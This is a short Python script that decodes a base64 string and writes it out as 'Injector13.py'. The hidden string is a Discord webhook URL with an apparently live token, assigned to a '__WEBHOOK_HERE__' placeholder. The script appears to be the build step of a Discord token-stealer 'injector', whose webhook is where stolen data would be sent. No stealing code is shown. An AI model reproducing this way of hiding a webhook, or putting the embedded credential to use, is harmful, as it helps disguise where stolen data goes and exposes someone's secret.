
import base64

obs = r'X19XRUJIT09LX0hFUkVfXyA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDQ4NDgxMzA5OTU1MjA3MTY4L2VvYXZ6WEJPQ0o0ZmtSc1hVRmRidTMtSjc1ekxLbGJ0ckVDRk1PRTFla1VXRlZmOTJyR1B2THJ6SWZyLTFvZDBHeTdkIg=='

# Decompress the obfuscated code
decode1 = base64.b64decode(obs)

# Decode the decompressed code
decoded_code = decode1.decode()

# Now you have the decoded and decompressed code available in the `decoded_code` variable

# Save the decompressed code to a file
output_file = "Injector13.py"  # Specify the desired output file name

with open(output_file, "w") as file:
    file.write(decoded_code)
    
